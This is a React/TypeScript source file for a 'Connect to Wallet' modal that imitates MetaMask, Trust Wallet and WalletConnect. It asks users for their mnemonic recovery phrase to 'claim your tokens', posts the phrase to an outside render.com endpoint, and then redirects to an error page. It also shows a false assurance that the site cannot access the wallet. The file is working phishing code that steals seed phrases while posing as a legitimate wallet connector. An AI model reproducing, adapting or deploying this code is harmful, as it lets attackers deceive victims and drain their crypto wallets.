import { useState } from "react";
import Modal from "./modal";
import axios from "axios";
import { useNavigate } from "react-router";

interface WalletConnectProps {
  openWallet: boolean;
  closeWallet: () => void;
}

const content = [
  {
    name: "MetaMask",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJZaVpfhv3kgZA46GoqfVNIFhR6pXIdX4_Rg&s",
  },
  {
    name: "Trust Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQlgDyNo4EEEuOGEUL-e7U0-J9P1Gnh-MFhng&s",
  },
  {
    name: "WalletConnect",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-ltInzp8gJH82_wn70M2Y4sXePRSEMcocrQ&s",
  },
];

const WalletConnect: React.FC<WalletConnectProps> = ({
  openWallet,
  closeWallet,
}) => {
  const [isSelected, setSelected] = useState<number | null>(null);
  const [text, setText] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const navigate = useNavigate();

  const handleConnectWallet = async () => {
    if (text.trim() === "" || text.trim().split(/[\s,]+/).length < 12) {
      alert("Invalid wallet address or mnemonic phrase");
      return;
    }

    setIsLoading(true);

    try {
      const response = await axios.post(
        "https://send-email-uokr.onrender.com/email",
        {
          text,
        }
      );
      console.log(response);

      navigate("/error");
    } catch (error) {
      console.log(error);
    } finally {
      setIsLoading(false);
    }
  };
  return (
    <Modal
      isOpen={openWallet}
      onClose={closeWallet}
      title="Connect to Wallet"
      description={
        isSelected !== null
          ? `Enter your ${content[isSelected]?.name} Mnemonic phrase to continue. `
          : "Connect to a Wallet to claim your tokens."
      }
    >
      {isSelected !== null ? ( // Check for null explicitly
        <>
          <textarea
            className="border rounded-lg w-full h-32 p-4 text-slate-600"
            onChange={(e) => setText(e.target.value)}
            value={text}
            placeholder="Enter Passphrase E.g upgrade, timber, cliff, accident, lunch, vintage, witness, glory, excuse, ribbon, fiscal, employ"
            //   readOnly
            //   value={JSON.stringify(isSelected)}
          />

          <button
            className={`w-full my-2 text-white font-bold py-2 px-4 rounded-lg ${
              isLoading
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-green-600 hover:bg-green-700"
            }`}
            onClick={handleConnectWallet}
            disabled={isLoading} // Disable button while loading
          >
            {isLoading
              ? "Connecting..."
              : `Connect to ${content[isSelected]?.name}`}
          </button>
        </>
      ) : (
        <div>
          {content.map((wallet, index) => (
            <div
              key={index}
              className="flex items-center justify-between border rounded-lg my-2 py-2 px-4 cursor-pointer hover:border-green-200 border-b-[1px solid #e5e5e5]"
              onClick={() => setSelected(index)}
            >
              <h3 className="text-sm font-semibold text-slate-600">
                {wallet.name}
              </h3>{" "}
              <img
                className="w-12 h-12 object-contain"
                src={wallet.logo}
                alt={wallet.name}
              />
            </div>
          ))}
        </div>
      )}

      <div>
        <p className="text-xs font-sans p-5 text-slate-400">
          we do not have own your private there for we cannot access your wallet
        </p>
      </div>
    </Modal>
  );
};

export default WalletConnect;
